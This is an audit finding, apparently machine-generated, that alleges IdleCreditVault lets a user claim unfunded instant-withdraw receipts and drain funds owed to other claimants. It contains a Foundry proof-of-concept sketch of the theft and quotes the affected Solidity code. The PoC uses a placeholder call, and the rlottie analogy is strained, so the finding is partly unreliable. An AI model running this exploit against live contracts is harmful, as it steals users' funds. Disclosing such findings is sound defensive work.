### Title
Unfunded instant-withdraw receipts are claimable at par, draining strategy funds reserved for other claimants - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

The external report is a type-confusion bug: data of one kind is interpreted and consumed as another. The closest analog in idle-tranches is `IdleCreditVault.claimInstantWithdrawRequest`, which conflates two distinct receipt "types" tracked in the same aggregate `instantWithdrawsRequests[_user]`: *funded* instant receipts (backed by underlying already collected via `collectInstantWithdrawFunds`, i.e. removed from `pendingInstantWithdraws`) and *unfunded* instant receipts (still counted in `pendingInstantWithdraws`, awaiting borrower funding). The claim path treats every receipt as funded and pays the full aggregate at par with no check against `pendingInstantWithdraws` or the funded remainder.

### Finding Description

`requestInstantWithdraw` records the request in `instantWithdrawsRequests[_user]`, `instantWithdrawsRequestsByEpoch`, `instantWithdrawClaimsByEpoch`, and adds it to `pendingInstantWithdraws`, which per the comment at `_defaultPrefundedInstantReserve` is "the still-unfunded remainder" — underlying is only actually moved into the strategy when the CDO calls `collectInstantWithdrawFunds`, which decrements `pendingInstantWithdraws` [1](#0-0) .

However `claimInstantWithdrawRequest` burns and pays `instantWithdrawsRequests[_user]` in full via `_transferFundedClaim`, without checking how much of that aggregate was ever funded [2](#0-1) . The only solvency guard inside `_transferFundedClaim` protects `defaultRecoveryReserve` — it does not reserve balance for other users' funded normal receipts (`withdrawsRequests`), other pending claims, or the unfunded `pendingInstantWithdraws` bucket itself [3](#0-2) .

This is the exact shape of the rlottie type confusion: one storage slot is reinterpreted as a different type than it represents. `instantWithdrawsRequests` mixes "requested but unfunded" and "requested and funded" basis, and the claim handler unconditionally consumes it as the funded type.

### Impact Explanation

An unprivileged tranche holder can:

1. During a running epoch with `allowInstantWithdraw` enabled (honest manager/owner configuration), call `requestWithdraw` on the CDO for an instant request, minting strategy-token receipts and increasing `pendingInstantWithdraws` before the borrower has funded anything.
2. Immediately call `claimInstantWithdrawRequest` (the CDO-side gate only checks `allowInstantWithdraw`, not funding status [4](#0-3) ).
3. Receive underlying up to the full requested amount whenever the strategy holds any balance — e.g. funded normal-withdraw receipts of other users awaiting `claimWithdrawRequest`, already-collected instant funds belonging to other requesters, or post-default reserves (once `defaultRecoveryReserve` is consumed by the `balance - reserve` guard, other funded balances are still exposed).

Result: direct theft of underlying earmarked for other claimants (one receipt paid, another user's funded claim left insolvent), breaking the "one receipt one payout" and solvency invariants. The loss is bounded only by the strategy's transferable balance outside `defaultRecoveryReserve`.

### Likelihood Explanation

Requires: instant withdrawals enabled and a strategy balance containing funded claims while `pendingInstantWithdraws` is non-zero. The vulnerable window exists whenever the borrower's instant-funding transfer lags the request — which is inherent to the design since `collectInstantWithdrawFunds` is a separate, later call from the CDO (`getInstantWithdrawFunds`/epoch-start flow). No privileged misbehavior, oracle manipulation, or default is needed; any KYC-passing holder of tranche tokens can execute it with two calls in the same epoch phase.

### Recommendation

In `claimInstantWithdrawRequest`, cap the payable amount to the funded portion: track a per-user or global funded instant balance (e.g. `fundedInstantWithdraws` incremented in `collectInstantWithdrawFunds` pro-rata, or compute claimable as `instantWithdrawsRequests[_user]` minus the user's share of `pendingInstantWithdraws`), and revert or pay only the funded remainder. Alternatively, gate the CDO-side `claimInstantWithdrawRequest` so it reverts while `pendingInstantWithdraws != 0` for the calling user's epoch, and make `_transferFundedClaim` additionally reserve `pendingInstantWithdraws` so unfunded claims can never spend funded balances.

### Proof of Concept

Foundry fork PoC sketch (against the repo's existing `test/foundry` harness, e.g. `IdleCreditVault.t.sol` setup with `cdoEpoch`, `strategy`, `tranche`, `underlying`):

```solidity
function testUnfundedInstantReceiptPaidAtPar() external {
    // Setup: honest manager enables instant withdrawals
    vm.prank(manager);
    cdoEpoch.setInstantWithdrawParams(100, 1e18, false);

    // Victim deposits and requests a NORMAL withdraw; it becomes funded after stopEpoch
    address victim = makeAddr('victim');
    uint256 vAmount = 100e6;
    uint256 vTranches = _depositWithUser(victim, vAmount);
    vm.prank(manager); cdoEpoch.startEpoch();
    _requestWithdrawWithUser(victim, vTranches);
    _stopCurrentEpochWithApr(10e18);          // borrower funds pendingWithdraws -> strategy now holds victim's funded claim
    vm.prank(manager); queue_or_cdo_process(); // strategy balance contains victim's funded underlying

    // Attacker deposits and starts a new epoch
    address attacker = makeAddr('attacker');
    uint256 aTranches = _depositWithUser(attacker, 100e6);
    vm.prank(manager); cdoEpoch.startEpoch(); // pendingInstantWithdraws path: attacker requests instant withdraw

    // Attacker requests an INSTANT withdraw; pendingInstantWithdraws increases, NO funds collected yet
    vm.prank(attacker);
    cdoEpoch.requestInstantWithdraw(aTranches); // CDO -> strategy.requestInstantWithdraw
    assertGt(strategy.pendingInstantWithdraws(), 0);

    // Attacker claims immediately: no funding check, pays from strategy balance (victim's funded claim)
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    uint256 stolen = underlying.balanceOf(attacker) - balPre;

    assertGt(stolen, 0);                       // attacker paid despite zero funding for his receipt
    // Victim's funded claim is now undercollateralized / reverts on insufficient balance
    vm.expectRevert();
    cdoEpoch.claimWithdrawRequestFor(victim);  // victim's funded payout insolvent
}
```

The precise entry points depend on whether the epoch CDO exposes `requestInstantWithdraw`/`claimInstantWithdrawRequest` directly (IdleCDOEpochVariant forwards both to `IdleCreditVault` [4](#0-3) ); the invariant violation is that `strategy.pendingInstantWithdraws() > 0` while the strategy's underlying balance — backing the victim's funded receipts — is spent to satisfy the attacker's unfunded receipt.

  function requestInstantWithdraw(uint256 _amount, address _user) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }

  /// @notice claim the instant withdraw request
  /// @dev we transfer the underlying tokens
  /// @param _user address of the user
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
  }

  /// @notice collect the instant withdraw funds
  /// @dev only IdleCDO can call this function
  /// @param _amount number of tokens to collect
  function collectInstantWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    if (_amount == 0) return;
    pendingInstantWithdraws -= _amount;
    underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
  }

  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
